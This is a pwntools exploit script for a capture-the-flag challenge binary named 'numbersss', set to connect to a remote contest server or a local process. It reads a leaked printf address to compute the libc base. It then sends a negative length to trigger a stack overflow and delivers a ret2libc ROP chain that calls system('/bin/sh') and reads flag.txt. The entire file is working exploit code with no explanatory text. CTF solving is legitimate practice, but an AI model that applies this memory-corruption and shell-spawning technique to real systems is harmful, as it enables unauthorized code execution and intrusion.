from pwn import *


binary = "src/numbersss"
elf = context.binary = ELF(binary, checksec=False)
libc = ELF("libc.so.6", checksec=False)

gs = """
break *vuln+201
continue
"""

if args.REMOTE:
    p = remote("numbersss.chal.cyberjousting.com", 1337)
elif args.REMOTE2:
    p = remote("localhost", 40003)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### LIBC LEAK ###
printf = int(p.recvline().strip().split(b' ')[-1][2:], 16)
print("printf: ", hex(printf))
libc_base = printf - libc.sym["printf"]
print("libc: ", hex(libc_base))


### EXPLOIT ###
p.sendline(b'-10')
p.recvline()

payload = b'A' * 24
payload += p64(libc_base + 0x23159)                         # ret for stack alignment
payload += p64(libc_base + 0x240e5)                         # pop rdi; ret
payload += p64(libc_base + next(libc.search(b"/bin/sh")))   # /bin/sh
payload += p64(libc_base + libc.sym["system"])              # system
payload += b'B'*190 + b'cat flag.txt'

p.sendline(payload)


p.interactive()